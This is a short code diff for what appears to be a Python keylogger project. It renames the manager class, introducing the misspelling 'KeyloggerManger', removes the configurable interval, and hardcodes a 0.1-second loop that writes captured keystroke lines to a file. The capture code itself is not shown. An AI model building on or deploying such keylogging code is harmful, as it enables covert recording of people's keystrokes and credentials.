@@ -2,9 +2,8 @@ from keylogger_service import KeyloggerService
 from file_writer import FileWriter
 import time
 
-class KeyloggerManager:
-    def __init__(self, interval=1):
-        self.interval = interval
+class KeyloggerManger:
+    def __init__(self):
         self.keylogger = KeyloggerService()
         self.writer = FileWriter()
 
@@ -18,7 +17,7 @@ class KeyloggerManager:
                     for line in lines:
                         self.writer.write(line)
                     self.keylogger.logged_lines = []
-                time.sleep(self.interval)
+                time.sleep(0.1)
         except KeyboardInterrupt:
             self.keylogger.stop_logging()
             lines = self.keylogger.get_logged_lines()
